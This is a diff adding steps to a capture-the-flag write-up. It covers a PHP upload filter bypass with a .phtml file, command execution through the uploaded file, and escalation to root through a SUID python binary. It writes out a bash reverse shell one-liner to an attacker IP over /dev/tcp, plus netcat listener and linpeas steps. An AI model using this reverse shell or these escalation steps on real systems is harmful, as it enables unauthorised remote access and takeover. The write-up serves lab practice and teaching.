@@ -44,8 +44,38 @@ Looks like there is a filter on here which does not allow PHP. After researching
 
 <img width="446" alt="image" src="https://user-images.githubusercontent.com/114961392/207183209-227d069c-c060-4762-aceb-6ca769f2a3a6.png">
 
-After uploading the file with the extension phtml, I will use curl to activate the PHP file in the **/uploads** directory and run commands.  
+After uploading the file with the extension phtml, I will use curl to activate the PHP file in the **/uploads** directory and run commands. This can also be done using **Burp Suite**.
 
 <img width="328" alt="image" src="https://user-images.githubusercontent.com/114961392/207183504-cafdda8a-7475-4ef1-8c0e-0b23ffe2ebe4.png">
 
-The **id** command was successful so now let's try getting a reverse shell.  
+<img width="598" alt="image" src="https://user-images.githubusercontent.com/114961392/207190118-3195f651-4265-45bb-95b0-e62af36442ed.png">
+
+The **id** command was successful so now let's try getting a reverse shell. I will replace the id command with a bash script to connect back to my machine. Remember to URL encode otherwise it will not work.    
+**bash -c "bash -i >& /dev/tcp/10.4.2.215/9001 0>&1"**  
+
+<img width="297" alt="image" src="https://user-images.githubusercontent.com/114961392/207192261-9c191a28-acfa-4c7a-96ea-4c54fc73dc5d.png">
+
+Open up a netcat listener before running the command and you will catch the connection.  
+
+<img width="404" alt="image" src="https://user-images.githubusercontent.com/114961392/207192547-65673010-de1e-4114-843a-b5c83955d6ed.png">
+
+We can find the user flag in the /var/www/ directory.  
+
+<img width="197" alt="image" src="https://user-images.githubusercontent.com/114961392/207193528-e8deda4c-6b93-4560-b3b5-ae5281d8ebe1.png">
+
+## Privilege Escalation
+Now to get to root, first let's upload **linpeas** to the target's tmp directory to find a vulnerable path. Before continuing, I will upgrade the terminal using for a more stable connection.  
+
+<img width="407" alt="image" src="https://user-images.githubusercontent.com/114961392/207196319-c2c6da5e-a61f-45d2-ae20-704f79afbdb3.png">
+
+After running linpeas, we can see that python has SUID permissions. We should be able to use this to escalate privileges.  
+
+<img width="746" alt="image" src="https://user-images.githubusercontent.com/114961392/207196825-27d2b27f-0eb4-47fe-9b35-05d23d6e4628.png">
+
+If we have a look at [GTFOBins](https://gtfobins.github.io/gtfobins/python/) in the python section, there is some commands to escalate privileges.  
+
+<img width="622" alt="image" src="https://user-images.githubusercontent.com/114961392/207198575-3dfcf30f-7313-4c47-847a-a67970a02ac9.png">
+
+I will use this and now we have root access and can capture the root flag.  
+
+<img width="132" alt="image" src="https://user-images.githubusercontent.com/114961392/207198669-d4d2db9a-086c-47fc-b022-a1308dd405f6.png">
